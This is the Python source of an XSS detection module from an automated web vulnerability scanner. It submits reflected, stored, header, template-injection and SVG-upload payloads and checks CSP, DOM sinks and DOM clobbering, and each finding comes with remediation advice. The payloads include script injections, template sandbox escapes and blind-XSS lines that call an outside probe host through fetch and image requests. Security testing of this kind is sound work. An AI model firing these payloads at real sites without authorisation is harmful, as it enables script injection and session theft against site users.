"""
XSSTester — Professional-grade Cross-Site Scripting vulnerability detection.
OWASP A03:2021 — Injection (XSS).

Tests for: reflected, stored, DOM-based, polyglot, context-aware,
mutation XSS, CSP bypass, DOM clobbering, header-based injection,
and filter bypass XSS vectors across 250+ payloads.
"""
import re
import logging
import html
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .base_tester import BaseTester
from apps.scanning.engine.payloads.xss_payloads import (
    get_xss_payloads_by_depth,
    CANARY,
    DOM_SOURCES,
    DOM_SINKS,
    ATTRIBUTE_INJECTION,
    JS_CONTEXT,
    POLYGLOTS,
    FILTER_BYPASS,
    MUTATION_XSS,
    CSP_BYPASS,
)

logger = logging.getLogger(__name__)

# CSP directives that protect against XSS
_CSP_XSS_DIRECTIVES = {
    'script-src', 'default-src', 'object-src', 'base-uri',
}

# Weak CSP patterns
_WEAK_CSP_PATTERNS = [
    (r"'unsafe-inline'", "Allows inline scripts — XSS payloads execute directly"),
    (r"'unsafe-eval'", "Allows eval() — enables script gadget attacks"),
    (r'\*', "Wildcard source — allows scripts from any origin"),
    (r'data:', "data: URI allowed — enables data:text/html script injection"),
    (r'blob:', "blob: URI allowed — enables blob-based script execution"),
    (r'http:', "Insecure http: allowed — enables MitM injection of scripts"),
]

# Headers that may reflect user input (for header-based XSS)
_INJECTABLE_HEADERS = ['Referer', 'User-Agent', 'X-Forwarded-For', 'X-Forwarded-Host']


class XSSTester(BaseTester):
    """Test for reflected, stored, DOM-based, mutation, and CSP-bypass XSS."""

    TESTER_NAME = 'XSS'

    def test(self, page, depth: str = 'medium', recon_data: dict = None) -> list:
        vulnerabilities = []
        payloads = get_xss_payloads_by_depth(depth)
        payloads = self._augment_payloads_with_seclists(payloads, 'xss', recon_data)

        # WAF-aware: prioritize filter bypass payloads when WAF detected
        if self._should_use_waf_bypass(recon_data):
            payloads = POLYGLOTS + FILTER_BYPASS + payloads
            logger.info('WAF detected — prepending filter bypass + polyglot payloads for XSS')

        # Test URL parameters for reflected XSS
        for param_name in page.parameters:
            vuln = self._test_reflected_xss(page.url, param_name, payloads)
            if vuln:
                vulnerabilities.append(vuln)

        # Test form inputs for reflected XSS
        for form in page.forms:
            for inp in form.inputs:
                if inp.input_type in ('hidden', 'submit', 'button', 'file'):
                    continue
                vuln = self._test_form_xss(form, inp, payloads, page.url)
                if vuln:
                    vulnerabilities.append(vuln)

        # Check for DOM XSS indicators in page source
        dom_vulns = self._check_dom_xss(page)
        vulnerabilities.extend(dom_vulns)

        # Context-aware XSS detection (medium/deep)
        if depth in ('medium', 'deep'):
            for param_name in page.parameters:
                if not any(v.get('name', '').endswith(param_name) for v in vulnerabilities):
                    vuln = self._test_context_aware_xss(page.url, param_name)
                    if vuln:
                        vulnerabilities.append(vuln)

            # CSP analysis and bypass testing
            csp_vulns = self._analyze_csp(page)
            vulnerabilities.extend(csp_vulns)

        # Deep-only tests: stored XSS, mutation XSS, DOM clobbering, header XSS
        if depth == 'deep':
            for form in page.forms:
                vuln = self._test_stored_xss(form, page)
                if vuln:
                    vulnerabilities.append(vuln)

            # Mutation XSS — browser parser differential exploitation
            for param_name in page.parameters:
                if not any(v.get('name', '').endswith(param_name) for v in vulnerabilities):
                    vuln = self._test_mutation_xss(page.url, param_name)
                    if vuln:
                        vulnerabilities.append(vuln)

            # DOM clobbering detection
            dom_clobber_vulns = self._check_dom_clobbering(page)
            vulnerabilities.extend(dom_clobber_vulns)

            # Header-based XSS (reflected via Referer, User-Agent, etc.)
            header_vulns = self._test_header_xss(page)
            vulnerabilities.extend(header_vulns)

            # Phase 8: Blind XSS (callback canary)
            for form in page.forms:
                vuln = self._test_blind_xss(form, page)
                if vuln:
                    vulnerabilities.append(vuln)

            # Phase 8: Client-Side Template Injection (CSTI)
            for param_name in page.parameters:
                vuln = self._test_csti(page.url, param_name)
                if vuln:
                    vulnerabilities.append(vuln)

            # Phase 8: SVG-based XSS via file upload forms
            for form in page.forms:
                vuln = self._test_svg_xss(form, page)
                if vuln:
                    vulnerabilities.append(vuln)

            # Phase 8: DOM clobbering escalation
            dom_esc_vulns = self._test_dom_clobbering_escalation(page)
            vulnerabilities.extend(dom_esc_vulns)

        return vulnerabilities

    def _test_reflected_xss(self, url, param_name, payloads):
        """Test URL parameter for reflected XSS."""
        for payload in payloads:
            tagged_payload = f'{CANARY}{payload}'
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param_name] = tagged_payload

            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(params, doseq=True), ''
            ))

            response = self._make_request('GET', test_url)
            if response and self._is_reflected(response.text, payload):
                return self._build_vuln(
                    name=f'Reflected XSS in Parameter: {param_name}',
                    severity='high',
                    category='Cross-Site Scripting',
                    description=f'The parameter "{param_name}" reflects user input without proper encoding, '
                               f'allowing injection of malicious scripts.',
                    impact='An attacker can execute arbitrary JavaScript in a victim\'s browser, '
                          'stealing session cookies, credentials, or performing actions on behalf of the user.',
                    remediation='Encode all user input before rendering in HTML. Use context-aware output encoding. '
                               'Implement Content Security Policy (CSP) headers. '
                               'In templates: use {{variable}} with auto-escaping enabled.',
                    cwe='CWE-79',
                    cvss=6.1,
                    affected_url=url,
                    evidence=f'Parameter: {param_name}\nPayload: {payload}\nPayload was reflected unescaped in response.',
                )
        return None

    def _test_form_xss(self, form, inp, payloads, page_url):
        """Test form input for reflected XSS."""
        for payload in payloads:
            data = {}
            for form_inp in form.inputs:
                if form_inp.name == inp.name:
                    data[form_inp.name] = f'{CANARY}{payload}'
                else:
                    data[form_inp.name] = form_inp.value or 'test'

            target_url = form.action or page_url
            method = form.method.upper()

            if method == 'POST':
                response = self._make_request('POST', target_url, data=data)
            else:
                response = self._make_request('GET', target_url, params=data)

            if response and self._is_reflected(response.text, payload):
                return self._build_vuln(
                    name=f'Reflected XSS in Form Field: {inp.name}',
                    severity='high',
                    category='Cross-Site Scripting',
                    description=f'The form field "{inp.name}" reflects input without encoding.',
                    impact='Attackers can inject scripts that steal user sessions, redirect users, or modify page content.',
                    remediation='Apply output encoding. Use DOMPurify for client-side sanitization. '
                               'Set Content-Security-Policy header to restrict inline scripts.',
                    cwe='CWE-79',
                    cvss=6.1,
                    affected_url=target_url,
                    evidence=f'Form: {form.method} {target_url}\nField: {inp.name}\nPayload: {payload}',
                )
        return None

    def _test_context_aware_xss(self, url, param_name):
        """Detect injection context and use context-appropriate payloads."""
        # First, inject a harmless canary to detect the rendering context
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param_name] = CANARY
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                               parsed.params, urlencode(params, doseq=True), ''))

        response = self._make_request('GET', test_url)
        if not response or CANARY not in (response.text or ''):
            return None

        body = response.text
        canary_idx = body.find(CANARY)

        # Determine context from surrounding characters
        before = body[max(0, canary_idx - 50):canary_idx]
        after = body[canary_idx + len(CANARY):canary_idx + len(CANARY) + 50]

        context_payloads = []
        context_name = 'unknown'

        if re.search(r'["\'][\s]*$', before) and re.search(r'^[\s]*["\']', after):
            # Inside HTML attribute
            context_payloads = ATTRIBUTE_INJECTION[:5]
            context_name = 'HTML attribute'
        elif re.search(r'<script[^>]*>', before, re.IGNORECASE):
            # Inside JavaScript
            context_payloads = JS_CONTEXT[:5]
            context_name = 'JavaScript'
        elif re.search(r'href\s*=\s*["\']?$', before, re.IGNORECASE):
            # Inside URL/href attribute
            context_payloads = ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>']
            context_name = 'URL attribute'
        else:
            # HTML body context
            context_payloads = POLYGLOTS[:3]
            context_name = 'HTML body'

        for payload in context_payloads:
            params[param_name] = payload
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, urlencode(params, doseq=True), ''))
            resp = self._make_request('GET', test_url)
            if resp and self._is_reflected(resp.text, payload):
                return self._build_vuln(
                    name=f'Context-Aware XSS in Parameter: {param_name}',
                    severity='high',
                    category='Cross-Site Scripting',
                    description=f'The parameter "{param_name}" is vulnerable to XSS in {context_name} context. '
                               f'A context-specific payload was reflected unescaped.',
                    impact='An attacker can execute JavaScript by breaking out of the '
                          f'{context_name} context where user input is rendered.',
                    remediation=f'Apply {context_name}-appropriate output encoding. '
                               'Use a context-aware template engine with auto-escaping.',
                    cwe='CWE-79',
                    cvss=6.1,
                    affected_url=url,
                    evidence=f'Context: {context_name}\nPayload: {payload}',
                )
        return None

    def _test_stored_xss(self, form, page):
        """Test for stored XSS by submitting payload and checking if it persists."""
        # Only test forms that look like they store data (comments, posts, profiles)
        store_indicators = ['comment', 'message', 'post', 'content', 'body',
                           'text', 'description', 'bio', 'feedback', 'review', 'note']

        text_input = None
        for inp in form.inputs:
            if inp.input_type in ('hidden', 'submit', 'button', 'file', 'image'):
                continue
            if any(ind in (inp.name or '').lower() for ind in store_indicators):
                text_input = inp
                break

        if not text_input:
            return None

        stored_payload = f'{CANARY}<script>alert("StoredXSS")</script>'
        data = {}
        for form_inp in form.inputs:
            if form_inp.name == text_input.name:
                data[form_inp.name] = stored_payload
            else:
                data[form_inp.name] = form_inp.value or 'test'

        target_url = form.action or page.url
        method = form.method.upper()

        if method == 'POST':
            self._make_request('POST', target_url, data=data)
        else:
            self._make_request('GET', target_url, params=data)

        # Now fetch the page again to check if payload persisted
        check_response = self._make_request('GET', page.url)
        if check_response and self._is_reflected(check_response.text, '<script>alert("StoredXSS")</script>'):
            return self._build_vuln(
                name=f'Stored XSS via Form Field: {text_input.name}',
                severity='critical',
                category='Cross-Site Scripting',
                description=f'The form field "{text_input.name}" stores user input that is rendered '
                           f'without sanitization, enabling persistent XSS attacks.',
                impact='Every user who views the affected page will execute the attacker\'s script. '
                      'This can lead to mass session hijacking, defacement, or worm propagation.',
                remediation='Sanitize all stored user input. Use allowlist-based HTML sanitization '
                           '(e.g., bleach, DOMPurify). Encode output in all contexts.',
                cwe='CWE-79',
                cvss=8.1,
                affected_url=target_url,
                evidence=f'Field: {text_input.name}\nPayload persisted in page source after submission.',
            )
        return None

    def _is_reflected(self, body, payload):
        """Check if XSS payload is reflected unescaped in response."""
        if not body:
            return False

        # Check direct reflection (unescaped)
        if payload in body:
            encoded = html.escape(payload)
            if encoded not in body or payload in body.replace(encoded, ''):
                return True

        # Check template injection results
        if payload == '{{7*7}}' and '49' in body:
            return True
        if payload == '${7*7}' and '49' in body:
            return True
        if payload == "{{7*'7'}}" and '7777777' in body:
            return True

        # Check partial reflection (payload without some characters)
        if len(payload) > 10:
            core = payload[1:-1]  # Strip first/last char
            if core in body and html.escape(core) not in body:
                return True

        return False

    def _check_dom_xss(self, page):
        """Check for potential DOM-based XSS by analyzing source/sink combinations."""
        body = page.body
        if not body:
            return []

        vulns = []
        found_sources = []
        found_sinks = []

        # Check for DOM XSS sources
        for pattern in DOM_SOURCES:
            if re.search(pattern, body):
                found_sources.append(pattern.replace('\\', '').replace('\\s*\\(', '()'))

        # Check for DOM XSS sinks
        for pattern in DOM_SINKS:
            if re.search(pattern, body):
                found_sinks.append(pattern.replace('\\', '').replace('\\s*\\(', '()'))

        # If both sources and sinks are found — high risk
        if found_sources and found_sinks:
            vulns.append(self._build_vuln(
                name='DOM-based XSS: Source-Sink Taint Flow Detected',
                severity='high',
                category='Cross-Site Scripting',
                description=f'The page contains both DOM XSS sources ({", ".join(found_sources[:3])}) '
                           f'and sinks ({", ".join(found_sinks[:3])}), creating potential taint flows.',
                impact='If user-controlled data from sources flows into sinks without sanitization, '
                      'attackers can execute arbitrary JavaScript in the victim\'s browser.',
                remediation='Audit all data flows from sources to sinks. Use textContent instead of innerHTML. '
                           'Sanitize all user input with DOMPurify before DOM insertion.',
                cwe='CWE-79',
                cvss=6.1,
                affected_url=page.url,
                evidence=f'Sources: {", ".join(found_sources[:5])}\nSinks: {", ".join(found_sinks[:5])}',
            ))
        elif found_sinks:
            # Only sinks without identified sources — medium risk
            vulns.append(self._build_vuln(
                name='Potential DOM-based XSS Sinks Detected',
                severity='medium',
                category='Cross-Site Scripting',
                description=f'The page contains JavaScript functions known as DOM XSS sinks: '
                           f'{", ".join(found_sinks[:5])}.',
                impact='If user-controlled data flows into these sinks, attackers may execute '
                      'arbitrary JavaScript.',
                remediation='Avoid using dangerous DOM manipulation methods. Use textContent instead '
                           'of innerHTML. Sanitize all user input with DOMPurify before inserting into the DOM.',
                cwe='CWE-79',
                cvss=5.4,
                affected_url=page.url,
                evidence=f'DOM sinks found: {", ".join(found_sinks[:5])}',
            ))

        return vulns

    # ── New Phase 3 methods ───────────────────────────────────────────────────

    def _analyze_csp(self, page):
        """Analyze Content-Security-Policy headers for XSS-relevant weaknesses."""
        vulns = []
        response = self._make_request('GET', page.url)
        if not response:
            return vulns

        csp_header = (
            response.headers.get('Content-Security-Policy', '')
            or response.headers.get('Content-Security-Policy-Report-Only', '')
        )

        # No CSP at all
        if not csp_header:
            vulns.append(self._build_vuln(
                name='Missing Content-Security-Policy Header',
                severity='medium',
                category='Cross-Site Scripting',
                description='The page does not set a Content-Security-Policy header. '
                           'CSP is a critical defence-in-depth layer against XSS.',
                impact='Without CSP, any reflected or stored XSS payload executes unrestricted. '
                      'Inline scripts, eval(), and external script loads are all permitted.',
                remediation="Add a strict CSP header. At minimum: "
                           "Content-Security-Policy: default-src 'self'; script-src 'self'; "
                           "object-src 'none'; base-uri 'self'",
                cwe='CWE-693',
                cvss=5.0,
                affected_url=page.url,
                evidence='No Content-Security-Policy header found in response.',
            ))
            return vulns

        # Parse directives
        directives = {}
        for directive in csp_header.split(';'):
            directive = directive.strip()
            if not directive:
                continue
            parts = directive.split()
            if parts:
                directives[parts[0].lower()] = ' '.join(parts[1:]) if len(parts) > 1 else ''

        weaknesses = []
        for directive_name in _CSP_XSS_DIRECTIVES:
            value = directives.get(directive_name, '')
            if not value and directive_name != 'default-src':
                # Missing specific directive — falls back to default-src
                value = directives.get('default-src', '')
            for pattern, desc in _WEAK_CSP_PATTERNS:
                if re.search(pattern, value):
                    weaknesses.append(f'{directive_name}: {desc}')

        if weaknesses:
            vulns.append(self._build_vuln(
                name='Weak Content-Security-Policy (XSS Bypass Possible)',
                severity='medium',
                category='Cross-Site Scripting',
                description=f'The CSP header has {len(weaknesses)} weakness(es) that allow '
                           'XSS payload execution despite the policy.',
                impact='Attackers can bypass CSP using inline scripts, eval-based gadgets, or '
                      'loading scripts from permitted origins.',
                remediation="Remove 'unsafe-inline' and 'unsafe-eval'. Use nonce-based or "
                           "hash-based script allowlisting. Restrict sources to specific domains.",
                cwe='CWE-693',
                cvss=5.8,
                affected_url=page.url,
                evidence='CSP: ' + csp_header[:300] + '\n\nWeaknesses:\n' +
                        '\n'.join(f'  - {w}' for w in weaknesses[:10]),
            ))

            # Try CSP bypass payloads if unsafe-inline or unsafe-eval present
            has_unsafe = any("'unsafe-inline'" in w or "'unsafe-eval'" in w for w in weaknesses)
            if has_unsafe:
                for param_name in list(page.parameters)[:3]:
                    vuln = self._test_csp_bypass_payloads(page.url, param_name)
                    if vuln:
                        vulns.append(vuln)
                        break

        return vulns

    def _test_csp_bypass_payloads(self, url, param_name):
        """Test CSP bypass payloads against a reflectable parameter."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for payload in CSP_BYPASS[:6]:
            params[param_name] = payload
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, urlencode(params, doseq=True), ''))
            resp = self._make_request('GET', test_url)
            if resp and self._is_reflected(resp.text, payload):
                return self._build_vuln(
                    name=f'CSP Bypass XSS: {param_name}',
                    severity='high',
                    category='Cross-Site Scripting',
                    description=f'A CSP bypass payload was reflected unescaped in parameter '
                               f'"{param_name}". The Content-Security-Policy can be circumvented.',
                    impact='Despite CSP protections, attackers can execute JavaScript using '
                          'script gadgets from trusted CDNs or policy loopholes.',
                    remediation="Implement strict CSP with nonces. Remove 'unsafe-inline' and "
                               "'unsafe-eval'. Audit trusted script sources for JSONP/Angular gadgets.",
                    cwe='CWE-79',
                    cvss=7.1,
                    affected_url=url,
                    evidence=f'Parameter: {param_name}\nCSP bypass payload reflected:\n{payload[:200]}',
                )
        return None

    def _test_mutation_xss(self, url, param_name):
        """Test mutation XSS payloads that exploit browser HTML parser differentials.

        Mutation XSS (mXSS) bypasses server-side sanitizers by exploiting the
        difference between how the server parses HTML and how the browser
        re-serializes it during DOM construction.
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for payload in MUTATION_XSS[:8]:
            params[param_name] = payload
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, urlencode(params, doseq=True), ''))
            resp = self._make_request('GET', test_url)
            if resp and self._is_reflected(resp.text, payload):
                return self._build_vuln(
                    name=f'Mutation XSS (mXSS) in Parameter: {param_name}',
                    severity='high',
                    category='Cross-Site Scripting',
                    description=f'The parameter "{param_name}" reflects a mutation XSS payload. '
                               'mXSS exploits browser parser re-serialization to bypass '
                               'server-side HTML sanitizers.',
                    impact='Even applications using DOMPurify or similar sanitizers may be '
                          'vulnerable. The browser mutates the injected HTML during DOM '
                          'construction, activating the payload after sanitization.',
                    remediation='Update HTML sanitizer libraries to the latest version. '
                               'Use DOMPurify with SAFE_FOR_TEMPLATES option. Prefer '
                               'textContent over innerHTML.',
                    cwe='CWE-79',
                    cvss=7.1,
                    affected_url=url,
                    evidence=f'Parameter: {param_name}\nmXSS payload: {payload[:200]}',
                )
        return None

    def _check_dom_clobbering(self, page):
        """Detect DOM clobbering opportunities in page source.

        DOM clobbering overrides JavaScript variables/properties by injecting
        HTML elements with matching id/name attributes, hijacking application logic.
        """
        vulns = []
        body = page.body
        if not body:
            return vulns

        # Patterns indicating clobberable references
        clobber_patterns = [
            (r'document\.getElementById\s*\(\s*["\'](\w+)["\']\s*\)\.(\w+)',
             'getElementById property access'),
            (r'window\.(\w+)\s*(?:\|\||&&|\?)', 'window property fallback'),
            (r'document\.forms\[', 'document.forms access'),
            (r'document\.anchors', 'document.anchors collection'),
            (r'(?:let|var|const)\s+\w+\s*=\s*document\.(\w+)', 'document property alias'),
        ]

        findings = []
        for pattern, desc in clobber_patterns:
            matches = re.findall(pattern, body)
            if matches:
                findings.append(f'{desc}: {matches[:3]}')

        # Check for elements using id= that shadow global names
        id_pattern = re.findall(r'id\s*=\s*["\'](\w+)["\']', body, re.IGNORECASE)
        global_names = {'location', 'name', 'domain', 'cookie', 'referrer',
                        'title', 'forms', 'images', 'links', 'scripts'}
        clobbered = set(id_pattern) & global_names
        if clobbered:
            findings.append(f'Elements clobber globals: {clobbered}')

        if findings:
            vulns.append(self._build_vuln(
                name='DOM Clobbering Opportunities Detected',
                severity='medium',
                category='Cross-Site Scripting',
                description='The page contains patterns susceptible to DOM clobbering. '
                           'Attackers can inject HTML elements that override JavaScript '
                           'variables via id/name attributes.',
                impact='DOM clobbering can redirect script execution flow, change application '
                      'behaviour, or chain with other vulnerabilities for full XSS.',
                remediation='Avoid relying on global DOM properties. Use Object.freeze() on '
                           'critical variables. Validate element types before accessing properties.',
                cwe='CWE-79',
                cvss=5.4,
                affected_url=page.url,
                evidence='DOM clobbering indicators:\n' +
                        '\n'.join(f'  - {f}' for f in findings[:8]),
            ))

        return vulns

    def _test_header_xss(self, page):
        """Test for XSS via HTTP request headers that get reflected in responses.

        Many applications reflect Referer, User-Agent, or X-Forwarded-For
        headers in error pages, logs, or admin panels without encoding.
        """
        vulns = []
        xss_payload = '<script>alert("HDRXSS")</script>'

        for header_name in _INJECTABLE_HEADERS:
            custom_headers = {header_name: f'{CANARY}{xss_payload}'}
            response = self._make_request('GET', page.url, headers=custom_headers)
            if response and self._is_reflected(response.text, xss_payload):
                vulns.append(self._build_vuln(
                    name=f'Header-Based XSS via {header_name}',
                    severity='high',
                    category='Cross-Site Scripting',
                    description=f'The HTTP header "{header_name}" is reflected in the '
                               f'response without encoding, enabling header injection XSS.',
                    impact='If an attacker can control or influence the reflected header '
                          '(e.g., via phishing link with Referer), they can execute '
                          'JavaScript in the context of the victim session.',
                    remediation=f'HTML-encode all values from HTTP headers before rendering. '
                               f'Never trust {header_name} as safe input.',
                    cwe='CWE-79',
                    cvss=6.1,
                    affected_url=page.url,
                    evidence=f'Header: {header_name}\nPayload: {xss_payload}\n'
                            f'Payload reflected unescaped in response body.',
                ))
                break  # One header XSS finding is sufficient

        return vulns

    # ── Phase 8 methods ───────────────────────────────────────────────────────

    def _test_blind_xss(self, form, page):
        """Test for blind XSS using a unique canary that may be stored and
        rendered later in admin panels, email notifications, or log viewers."""
        store_indicators = ['comment', 'message', 'feedback', 'contact', 'support',
                           'ticket', 'report', 'suggestion', 'name', 'email', 'subject']
        text_input = None
        for inp in form.inputs:
            if inp.input_type in ('hidden', 'submit', 'button', 'file', 'image'):
                continue
            if any(ind in (inp.name or '').lower() for ind in store_indicators):
                text_input = inp
                break
        if not text_input:
            return None

        blind_canary = f'SWAI_BLIND_{CANARY}'
        blind_payloads = [
            f'"><img src=x onerror=fetch("https://xss-probe.example/{blind_canary}")>',
            f"'><script>new Image().src='https://xss-probe.example/{blind_canary}'</script>",
        ]
        for payload in blind_payloads:
            data = {}
            for form_inp in form.inputs:
                if form_inp.name == text_input.name:
                    data[form_inp.name] = payload
                else:
                    data[form_inp.name] = form_inp.value or 'test'
            target_url = form.action or page.url
            method = form.method.upper()
            if method == 'POST':
                resp = self._make_request('POST', target_url, data=data)
            else:
                resp = self._make_request('GET', target_url, params=data)
            if resp and resp.status_code in (200, 201, 301, 302):
                check_resp = self._make_request('GET', page.url)
                if check_resp and blind_canary in (check_resp.text or ''):
                    return self._build_vuln(
                        name=f'Blind XSS via Form Field: {text_input.name}',
                        severity='high',
                        category='Cross-Site Scripting',
                        description=f'A blind XSS payload was stored via "{text_input.name}". '
                                   f'The canary was found in a subsequent page load, indicating '
                                   f'the payload is rendered without sanitization.',
                        impact='Blind XSS fires when an admin or another user views the stored data. '
                              'This can lead to admin session hijacking and full account takeover.',
                        remediation='Sanitize all stored user input with allowlist-based HTML filtering. '
                                   'Use Content-Security-Policy to block inline scripts.',
                        cwe='CWE-79',
                        cvss=7.5,
                        affected_url=target_url,
                        evidence=f'Field: {text_input.name}\nPayload: {payload}\n'
                                f'Canary "{blind_canary}" found in subsequent response.',
                    )
        return None

    def _test_csti(self, url, param_name):
        """Test for Client-Side Template Injection (Angular, Vue, React)."""
        csti_payloads = [
            # Angular
            ("{{constructor.constructor('alert(1)')()}}", 'Angular CSTI',
             lambda body: 'alert(1)' in body or 'function' in body),
            ('{{7*7}}', 'Angular expression',
             lambda body: '49' in body),
            # Vue 2
            ("{{_c.constructor('alert(1)')()}}", 'Vue 2 CSTI',
             lambda body: 'alert(1)' in body or 'function' in body),
            # Generic template
            ('${7*7}', 'Template literal injection',
             lambda body: '49' in body),
            ("{{7*'7'}}", 'Jinja2/Twig CSTI',
             lambda body: '7777777' in body),
        ]
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for payload, tpl_name, check_fn in csti_payloads:
            params[param_name] = payload
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, urlencode(params, doseq=True), ''))
            resp = self._make_request('GET', test_url)
            if resp and check_fn(resp.text or ''):
                # Verify it's not just echoing back the raw template syntax
                if payload not in (resp.text or '').replace(payload, '', 1):
                    return self._build_vuln(
                        name=f'Client-Side Template Injection ({tpl_name}): {param_name}',
                        severity='high',
                        category='Cross-Site Scripting',
                        description=f'The parameter "{param_name}" is rendered inside a client-side '
                                   f'template engine ({tpl_name}) without sanitization. '
                                   f'Template expressions are evaluated, enabling code execution.',
                        impact='CSTI allows arbitrary JavaScript execution within the template '
                              'engine sandbox, which can often be escaped to full XSS.',
                        remediation='Never render user input inside client-side template expressions. '
                                   'Use text interpolation instead of HTML interpolation. '
                                   'In Angular: use [textContent] instead of [innerHTML].',
                        cwe='CWE-79',
                        cvss=6.1,
                        affected_url=url,
                        evidence=f'Template engine: {tpl_name}\nPayload: {payload}\n'
                                f'Template expression was evaluated in response.',
                    )

        # React dangerouslySetInnerHTML detection
        body = ''
        resp = self._make_request('GET', url)
        if resp:
            body = resp.text or ''
        if 'dangerouslySetInnerHTML' in body:
            return self._build_vuln(
                name='React dangerouslySetInnerHTML Detected',
                severity='medium',
                category='Cross-Site Scripting',
                description='The page uses React\'s dangerouslySetInnerHTML, which renders raw HTML '
                           'without sanitization. If user input reaches this prop, XSS is possible.',
                impact='Any user-controlled data passed to dangerouslySetInnerHTML will be rendered '
                      'as raw HTML, enabling script injection.',
                remediation='Avoid dangerouslySetInnerHTML. If necessary, sanitize with DOMPurify '
                           'before passing to dangerouslySetInnerHTML.',
                cwe='CWE-79',
                cvss=5.4,
                affected_url=url,
                evidence='Found dangerouslySetInnerHTML usage in page source. '
                        'Manual review required to determine if user input flows into it.',
            )
        return None

    def _test_svg_xss(self, form, page):
        """Test for SVG-based XSS via file upload forms that accept SVG."""
        file_input = None
        for inp in form.inputs:
            if inp.input_type == 'file':
                file_input = inp
                break
        if not file_input:
            return None

        # Check if form accepts SVG (inspect accept attribute or just test)
        accept = (file_input.value or '').lower()
        if accept and 'svg' not in accept and 'image' not in accept and '*' not in accept:
            return None

        svg_payload = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg">'
            '<script>alert("SVG_XSS")</script>'
            '</svg>'
        )
        target_url = form.action or page.url
        files = {file_input.name: ('xss.svg', svg_payload.encode(), 'image/svg+xml')}
        data = {}
        for form_inp in form.inputs:
            if form_inp.input_type != 'file' and form_inp.name:
                data[form_inp.name] = form_inp.value or 'test'

        resp = self._make_request('POST', target_url, files=files, data=data)
        if resp and resp.status_code in (200, 201):
            resp_text = resp.text or ''
            if 'alert("SVG_XSS")' in resp_text or 'svg' in resp_text.lower():
                return self._build_vuln(
                    name=f'SVG-Based XSS via File Upload: {file_input.name}',
                    severity='high',
                    category='Cross-Site Scripting',
                    description=f'An SVG file containing a <script> tag was uploaded via '
                               f'"{file_input.name}" and the server accepted it. If the SVG '
                               f'is served inline, the script will execute.',
                    impact='Any user viewing the uploaded SVG will execute the embedded script, '
                          'enabling session hijacking, data theft, or defacement.',
                    remediation='Sanitize SVG uploads by stripping <script> tags and event handlers. '
                               'Serve user-uploaded SVGs with Content-Disposition: attachment. '
                               'Use Content-Type: image/svg+xml without inline rendering.',
                    cwe='CWE-79',
                    cvss=6.1,
                    affected_url=target_url,
                    evidence=f'Upload field: {file_input.name}\n'
                            f'SVG payload with <script> tag was accepted by the server.',
                )
        return None

    def _test_dom_clobbering_escalation(self, page):
        """Test for DOM clobbering escalation patterns.

        DOM clobbering uses named HTML elements to override global JS variables,
        potentially hijacking script execution flow.
        """
        body = page.body or ''
        vulns = []

        # Patterns where DOM clobbering can escalate
        clobber_patterns = [
            (r'window\.(\w+)\s*=\s*document\.getElementById\s*\(\s*[\'"](\w+)[\'"]\s*\)',
             'getElementById override'),
            (r'document\.(\w+)\s*\.\s*href', 'Named element href access'),
            (r'(\w+)\.src\s*=', 'Element src assignment'),
            (r'document\.forms\[', 'forms collection access'),
            (r'document\.anchors\[', 'anchors collection access'),
        ]

        findings = []
        for pattern, desc in clobber_patterns:
            matches = re.findall(pattern, body)
            if matches:
                findings.append(f'{desc}: {matches[:3]}')

        # Check for named elements that could clobber globals
        named_elements = re.findall(r'<(?:a|form|img|embed|object)\s+[^>]*(?:name|id)\s*=\s*[\'"](\w+)[\'"]',
                                    body, re.IGNORECASE)
        # Check if those names overlap with JS variable usage
        js_vars = set(re.findall(r'(?:window\.|document\.)(\w+)', body))
        clobberable = set(named_elements) & js_vars
        if clobberable:
            findings.append(f'Clobberable globals: {list(clobberable)[:5]}')

        if findings:
            vulns.append(self._build_vuln(
                name='DOM Clobbering Escalation Risk',
                severity='medium',
                category='Cross-Site Scripting',
                description='The page contains patterns where named HTML elements could override '
                           'JavaScript global variables via DOM clobbering, potentially hijacking '
                           'script execution flow.',
                impact='DOM clobbering can redirect script logic, change URLs loaded by the page, '
                      'or bypass security checks that rely on DOM properties.',
                remediation='Use Object.freeze() on critical global objects. Avoid relying on named '
                           'element access patterns. Use strict Content-Security-Policy.',
                cwe='CWE-79',
                cvss=5.4,
                affected_url=page.url,
                evidence='DOM clobbering indicators:\n' +
                        '\n'.join(f'  - {f}' for f in findings[:8]),
            ))
        return vulns
